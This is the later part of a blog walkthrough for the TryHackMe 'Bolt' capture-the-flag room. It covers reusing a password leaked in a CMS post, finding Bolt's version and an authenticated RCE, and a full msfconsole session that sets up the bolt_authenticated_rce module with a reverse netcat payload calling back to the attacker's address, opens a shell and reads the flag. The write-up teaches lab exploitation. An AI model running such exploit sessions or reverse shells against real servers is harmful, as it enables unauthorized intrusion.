+<p>Without much digging I&rsquo;m gonna guess it is <strong>bolt</strong> based on the overall theme of the room and indeed it is accepted as valid. This is weird because the post we can see in the page mentions the user is <strong>jake</strong> and he also posts his password <strong>REDACTED</strong> could this be a bug on the room? (Spoiler: It is not. XD )</p>
+<h2 id="task-3-what-is-the-password-we-can-find-for-the-username">[Task 3] What is the password we can find for the username?</h2>
+<p><img src="https://i.imgur.com/Swa5OGj.png" alt="Post from Admin with a Password"></p>
+<p>We already got a password in the previous task.</p>
+<h2 id="task-4-what-version-of-the-cms-is-installed-on-the-server-ex-name-111">[Task 4] What version of the CMS is installed on the server? (Ex: Name 1.1.1)</h2>
+<p>Since we have a username and password, we could try to google a bit common login page URL locations for Bolt CMS.
+When we try to access, we do get a login form.</p>
+<p><img src="https://i.imgur.com/3Q8d31i.png" alt="Bolt Login form"></p>
+<p>Once we are logged in we can see the installed version in the footer toolbar and with that we get the answer to the CMS version:</p>
+<p><img src="https://i.imgur.com/3Wv2bhG.png" alt="Bolt version installed"></p>
+<p>Let&rsquo;s move to the next question.</p>
+<h2 id="task-5-theres-an-exploit-for-a-previous-version-of-this-cms-which-allows-authenticated-rce-find-it-on-exploit-db-whats-its-edb-id">[Task 5] There&rsquo;s an exploit for a previous version of this CMS, which allows authenticated RCE. Find it on Exploit DB. What&rsquo;s its EDB-ID?</h2>
+<p>Using <strong>Exploit-DB</strong> we can look for RCE vulnerabilities for <strong>older</strong> versions of Bolt CMS.</p>
+<p><img src="https://i.imgur.com/DXLDHC9.png" alt="Exploit-DB"></p>
+<p>Let&rsquo;s move on.</p>
+<h2 id="task-6-metasploit-recently-added-an-exploit-module-for-this-vulnerability-whats-the-full-path-for-this-exploit-ex-exploit">[Task 6] Metasploit recently added an exploit module for this vulnerability. What&rsquo;s the full path for this exploit? (Ex: exploit/&hellip;.)</h2>
+<p>We fire up <strong>msfconsole</strong> and do a <strong>search bolt cms</strong> to see the available exploits:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">msf5 &gt; search bolt cms
+
+Matching Modules
+<span style="color:#f92672">================</span>
+
+   <span style="color:#75715e">#   Name                                              Disclosure Date  Rank       Check  Description</span>
+   -   ----                                              ---------------  ----       -----  -----------
+   <span style="color:#ae81ff">0</span>   auxiliary/admin/sunrpc/solaris_kcms_readfile      2003-01-22       normal     No     Solaris KCMS + TTDB Arbitrary File Read
+   <span style="color:#ae81ff">1</span>   auxiliary/gather/ipcamera_password_disclosure     2016-08-16       normal     No     JVC/Siemens/Vanderbilt IP-Camera Readfile Password Disclosure
+   <span style="color:#ae81ff">2</span>   auxiliary/gather/nuuo_cms_bruteforce              2018-10-11       normal     No     Nuuo Central Management Server User Session Token Bruteforce
+   <span style="color:#ae81ff">3</span>   auxiliary/gather/nuuo_cms_file_download           2018-10-11       normal     No     Nuuo Central Management Server Authenticated Arbitrary File Download
+   <span style="color:#ae81ff">4</span>   auxiliary/scanner/http/ektron_cms400net                            normal     No     Ektron CMS400.NET Default Password Scanner
+   <span style="color:#ae81ff">5</span>   auxiliary/scanner/http/s40_traversal              2011-04-07       normal     No     S40 0.4.2 CMS Directory Traversal Vulnerability
+   <span style="color:#ae81ff">6</span>   auxiliary/scanner/http/squiz_matrix_user_enum     2011-11-08       normal     No     Squiz Matrix User Enumeration Scanner
+   <span style="color:#ae81ff">7</span>   auxiliary/scanner/http/vcms_login                                  normal     No     V-CMS Login Utility
+   <span style="color:#ae81ff">8</span>   auxiliary/scanner/misc/cctv_dvr_login                              normal     No     CCTV DVR Login Scanning Utility
+   <span style="color:#ae81ff">9</span>   exploit/aix/rpc_cmsd_opcode21                     2009-10-07       great      No     AIX Calendar Manager Service Daemon <span style="color:#f92672">(</span>rpc.cmsd<span style="color:#f92672">)</span> Opcode <span style="color:#ae81ff">21</span> Buffer Overflow
+   <span style="color:#ae81ff">10</span>  exploit/linux/http/cayin_cms_ntp                  2020-06-04       excellent  Yes    Cayin CMS NTP Server RCE
+   <span style="color:#ae81ff">11</span>  exploit/linux/http/tiki_calendar_exec             2016-06-06       excellent  Yes    Tiki-Wiki CMS Calendar Command Execution
+   <span style="color:#ae81ff">12</span>  exploit/linux/http/vcms_upload                    2011-11-27       excellent  Yes    V-CMS PHP File Upload and Execute
+   <span style="color:#ae81ff">13</span>  exploit/multi/http/bolt_file_upload               2015-08-17       excellent  Yes    CMS Bolt File Upload Vulnerability
+   <span style="color:#ae81ff">14</span>  exploit/multi/http/cmsms_object_injection_rce     2019-03-26       normal     Yes    CMS Made Simple Authenticated RCE via object injection
+   <span style="color:#ae81ff">15</span>  exploit/multi/http/cmsms_showtime2_rce            2019-03-11       normal     Yes    CMS Made Simple <span style="color:#f92672">(</span>CMSMS<span style="color:#f92672">)</span> Showtime2 File Upload RCE
+   <span style="color:#ae81ff">16</span>  exploit/multi/http/cmsms_upload_rename_rce        2018-07-03       excellent  Yes    CMS Made Simple Authenticated RCE via File Upload/Copy
+   <span style="color:#ae81ff">17</span>  exploit/multi/http/familycms_less_exec            2011-11-29       excellent  Yes    Family Connections less.php Remote Command Execution
+   <span style="color:#ae81ff">18</span>  exploit/multi/http/getsimplecms_unauth_code_exec  2019-04-28       excellent  Yes    GetSimpleCMS Unauthenticated RCE
+   <span style="color:#ae81ff">19</span>  exploit/multi/http/lcms_php_exec                  2011-03-03       excellent  Yes    LotusCMS 3.0 eval<span style="color:#f92672">()</span> Remote Command Execution
+   <span style="color:#ae81ff">20</span>  exploit/multi/http/log1cms_ajax_create_folder     2011-04-11       excellent  Yes    Log1 CMS writeInfo<span style="color:#f92672">()</span> PHP Code Injection
+   <span style="color:#ae81ff">21</span>  exploit/multi/http/monstra_fileupload_exec        2017-12-18       excellent  Yes    Monstra CMS Authenticated Arbitrary File Upload
+   <span style="color:#ae81ff">22</span>  exploit/multi/http/navigate_cms_rce               2018-09-26       excellent  Yes    Navigate CMS Unauthenticated Remote Code Execution
+   <span style="color:#ae81ff">23</span>  exploit/multi/http/october_upload_bypass_exec     2017-04-25       excellent  Yes    October CMS Upload Protection Bypass Code Execution
+   <span style="color:#ae81ff">24</span>  exploit/multi/http/polarcms_upload_exec           2012-01-21       excellent  Yes    PolarBear CMS PHP File Upload Vulnerability
+   <span style="color:#ae81ff">25</span>  exploit/multi/http/sflog_upload_exec              2012-07-06       excellent  Yes    Sflog! CMS 1.0 Arbitrary File Upload Vulnerability
+   <span style="color:#ae81ff">26</span>  exploit/multi/http/totaljs_cms_widget_exec        2019-08-30       excellent  Yes    Total.js CMS <span style="color:#ae81ff">12</span> Widget JavaScript Code Injection
+   <span style="color:#ae81ff">27</span>  exploit/multi/php/php_unserialize_zval_cookie     2007-03-04       average    Yes    PHP <span style="color:#ae81ff">4</span> unserialize<span style="color:#f92672">()</span> ZVAL Reference Counter Overflow <span style="color:#f92672">(</span>Cookie<span style="color:#f92672">)</span>
+   <span style="color:#ae81ff">28</span>  exploit/unix/webapp/bolt_authenticated_rce        2020-05-07       excellent  Yes    Bolt CMS 3.7.0 - Authenticated Remote Code Execution
+   <span style="color:#ae81ff">29</span>  exploit/unix/webapp/get_simple_cms_upload_exec    2014-01-04       excellent  Yes    GetSimpleCMS PHP File Upload Vulnerability
+   <span style="color:#ae81ff">30</span>  exploit/unix/webapp/havalite_upload_exec          2013-06-17       excellent  Yes    Havalite CMS Arbitary File Upload Vulnerability
+   <span style="color:#ae81ff">31</span>  exploit/unix/webapp/instantcms_exec               2013-06-26       excellent  Yes    InstantCMS 1.6 Remote PHP Code Execution
+   <span style="color:#ae81ff">32</span>  exploit/unix/webapp/joomla_akeeba_unserialize     2014-09-29       excellent  Yes    Joomla Akeeba Kickstart Unserialize Remote Code Execution
+   <span style="color:#ae81ff">33</span>  exploit/unix/webapp/joomla_media_upload_exec      2013-08-01       excellent  Yes    Joomla Media Manager File Upload Vulnerability
+   <span style="color:#ae81ff">34</span>  exploit/unix/webapp/libretto_upload_exec          2013-06-14       excellent  Yes    LibrettoCMS File Manager Arbitary File Upload Vulnerability
+   <span style="color:#ae81ff">35</span>  exploit/unix/webapp/skybluecanvas_exec            2014-01-28       excellent  Yes    SkyBlueCanvas CMS Remote Code Execution
+   <span style="color:#ae81ff">36</span>  exploit/windows/browser/ie_execcommand_uaf        2012-09-14       good       No     MS12-063 Microsoft Internet Explorer execCommand Use-After-Free Vulnerability
+   <span style="color:#ae81ff">37</span>  exploit/windows/http/ektron_xslt_exec             2012-10-16       excellent  Yes    Ektron 8.02 XSLT Transform Remote Code Execution
+   <span style="color:#ae81ff">38</span>  exploit/windows/http/ektron_xslt_exec_ws          2015-02-05       excellent  Yes    Ektron 8.5, 8.7, 9.0 XSLT Transform Remote Code Execution
+   <span style="color:#ae81ff">39</span>  exploit/windows/http/kentico_staging_syncserver   2019-04-15       excellent  Yes    Kentico CMS Staging SyncServer Unserialize Remote Command Execution
+   <span style="color:#ae81ff">40</span>  exploit/windows/http/umbraco_upload_aspx          2012-06-28       excellent  No     Umbraco CMS Remote Command Execution
+   <span style="color:#ae81ff">41</span>  exploit/windows/local/bypassuac_comhijack         1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass <span style="color:#f92672">(</span>Via COM Handler Hijack<span style="color:#f92672">)</span>
+   <span style="color:#ae81ff">42</span>  exploit/windows/nuuo/nuuo_cms_fu                  2018-10-11       manual     No     Nuuo Central Management Server Authenticated Arbitrary File Upload
+   <span style="color:#ae81ff">43</span>  exploit/windows/nuuo/nuuo_cms_sqli                2018-10-11       normal     No     Nuuo Central Management Authenticated SQL Server SQLi
+   <span style="color:#ae81ff">44</span>  exploit/windows/smtp/njstar_smtp_bof              2011-10-31       normal     Yes    NJStar Communicator 3.00 MiniSMTP Buffer Overflow
+
+
+Interact with a module by name or index, <span style="color:#66d9ef">for</span> example use <span style="color:#ae81ff">44</span> or use exploit/windows/smtp/njstar_smtp_bof
+
+msf5 &gt; 
+</code></pre></div><p>by looking at the results returned and having found the vulnerability on <strong>Exploit-DB</strong> we get the answer to the room question.
+Let&rsquo;s try to exploit that in the next step.</p>
+<h2 id="task-7-set-the-lhost-lport-rhost-username-password-in-msfconsole-before-running-the-exploit">[Task 7] Set the LHOST, LPORT, RHOST, USERNAME, PASSWORD in msfconsole before running the exploit</h2>
+<p>Let&rsquo;s configure the options for our exploit, by doing <strong>show options</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using configured payload cmd/unix/reverse_netcat
+msf5 exploit<span style="color:#f92672">(</span>unix/webapp/bolt_authenticated_rce<span style="color:#f92672">)</span> &gt; show options
+
+Module options <span style="color:#f92672">(</span>exploit/unix/webapp/bolt_authenticated_rce<span style="color:#f92672">)</span>:
+
+   Name                 Current Setting        Required  Description
+   ----                 ---------------        --------  -----------
+   FILE_TRAVERSAL_PATH  ../../../public/files  yes       Traversal path from <span style="color:#e6db74">&#34;/files&#34;</span> on the web server to <span style="color:#e6db74">&#34;/root&#34;</span> on the server
+   PASSWORD                                    yes       Password to authenticate with
+   Proxies                                     no        A proxy chain of format type:host:port<span style="color:#f92672">[</span>,type:host:port<span style="color:#f92672">][</span>...<span style="color:#f92672">]</span>
+   RHOSTS                                      yes       The target host<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>, range CIDR identifier, or hosts file with syntax <span style="color:#e6db74">&#39;file:&lt;path&gt;&#39;</span>
+   RPORT                8***                   yes       The target port <span style="color:#f92672">(</span>TCP<span style="color:#f92672">)</span>
+   SRVHOST              0.0.0.0                yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT              <span style="color:#ae81ff">8080</span>                   yes       The local port to listen on.
+   SSL                  false                  no        Negotiate SSL/TLS <span style="color:#66d9ef">for</span> outgoing connections
+   SSLCert                                     no        Path to a custom SSL certificate <span style="color:#f92672">(</span>default is randomly generated<span style="color:#f92672">)</span>
+   TARGETURI            /                      yes       Base path to Bolt CMS
+   URIPATH                                     no        The URI to use <span style="color:#66d9ef">for</span> this exploit <span style="color:#f92672">(</span>default is random<span style="color:#f92672">)</span>
+   USERNAME                                    yes       Username to authenticate with
+   VHOST                                       no        HTTP server virtual host
+
+
+Payload options <span style="color:#f92672">(</span>cmd/unix/reverse_netcat<span style="color:#f92672">)</span>:
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address <span style="color:#f92672">(</span>an interface may be specified<span style="color:#f92672">)</span>
+   LPORT  <span style="color:#ae81ff">4444</span>             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   <span style="color:#ae81ff">2</span>   Linux <span style="color:#f92672">(</span>cmd<span style="color:#f92672">)</span>
+msf5 exploit<span style="color:#f92672">(</span>unix/webapp/bolt_authenticated_rce<span style="color:#f92672">)</span> &gt; set LHOST tun0
+LHOST <span style="color:#f92672">=</span>&gt; 10.13.0.34
+msf5 exploit<span style="color:#f92672">(</span>unix/webapp/bolt_authenticated_rce<span style="color:#f92672">)</span> &gt; set RHOSTS 10.10.105.96
+RHOSTS <span style="color:#f92672">=</span>&gt; 10.10.105.96
+msf5 exploit<span style="color:#f92672">(</span>unix/webapp/bolt_authenticated_rce<span style="color:#f92672">)</span> &gt; set USERNAME bolt
+USERNAME <span style="color:#f92672">=</span>&gt; bolt
+msf5 exploit<span style="color:#f92672">(</span>unix/webapp/bolt_authenticated_rce<span style="color:#f92672">)</span> &gt; set PASSWORD REDACTED
+PASSWORD <span style="color:#f92672">=</span>&gt; boltadmin123
+msf5 exploit<span style="color:#f92672">(</span>unix/webapp/bolt_authenticated_rce<span style="color:#f92672">)</span> &gt; 
+
+</code></pre></div><p>Let&rsquo;s run the exploit so we can answer the last question:</p>
+<h2 id="task-8-look-for-flagtxt-inside-the-machine">[Task 8] Look for flag.txt inside the machine.</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">msf5 exploit<span style="color:#f92672">(</span>unix/webapp/bolt_authenticated_rce<span style="color:#f92672">)</span> &gt; run
+
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 10.13.0.34:4444 
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Executing automatic check <span style="color:#f92672">(</span>disable AutoCheck to override<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> The target is vulnerable. Successfully changed the /bolt/profile username to PHP $_GET variable <span style="color:#e6db74">&#34;hxzhm&#34;</span>.
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">4</span> potential token<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> <span style="color:#66d9ef">for</span> creating .php files.
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Deleted file evhhumxnxs.php.
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Deleted file jfdcqabl.php.
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Deleted file hgpputegi.php.
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Used token dc684ac30691d198a52d1110d6 to create helqvqylpa.php.
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Attempting to execute the payload via <span style="color:#e6db74">&#34;/files/helqvqylpa.php?hxzhm=`payload`&#34;</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Command shell session <span style="color:#ae81ff">7</span> opened <span style="color:#f92672">(</span>10.13.0.34:4444 -&gt; 10.10.105.96:44727<span style="color:#f92672">)</span> at 2020-08-26 21:26:37 -0400
+<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> No response, may have executed a blocking payload!
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Deleted file helqvqylpa.php.
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Reverted user profile back to original state.
+
+ls
+index.html
+shell  
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying to find binary<span style="color:#f92672">(</span>python<span style="color:#f92672">)</span> on target machine
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found python at 
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using <span style="color:#e6db74">`</span>python<span style="color:#e6db74">`</span> to pop up an interactive shell
+pwd
+/home/bolt/public/files
+cat /home/bolt/flag.txt
+cat /home/flag.txt
+THM<span style="color:#f92672">{</span>FLAG_REDACTED_YOU_GOT_THIS!<span style="color:#f92672">}</span>
+
+</code></pre></div><p>The shell we got is quite basic and in my case we it hanged a lot of times. I was unable to upgrade that shell to meterpreter, but to be honest I tried it just once and moved on. I tried a bit of exploring probing some paths with <strong>cat</strong> looking for <strong>flag.txt</strong> and found it rather quickly.</p>
+<p>That&rsquo;s it for Bolt room. Hope you enjoyed it!</p>
+<p>As usual, happy hacking.</p>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+<br>
+<div class="container center" style="margin:10px !important;  text-align: center!important">
+    <div class="center">
+        <script src="https://tryhackme.com/badge/71634"></script>
+    </div>
+    <div class="center">
+        <a href="https://twitter.com/Tzero86" target="_blank" class="fa fa-twitter" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a>
+        <a href="https://github.com/Tzero86" target="_blank" class="fa fa-github" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a> 
+        <a href="https://www.linkedin.com/in/ermedina86/" target="_blank" class="fa fa-linkedin" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a> 
+        <br> 
+    </div>
+</div>
+
+
+
+        <div class="footer">
+    Made with <a href="https://gohugo.io/">Hugo</a> with
+    <a href="https://github.com/mrmierzejewski/hugo-theme-console/">Console Theme</a>. 
+</div>
+
+    </div>
+  </body>
+</html>
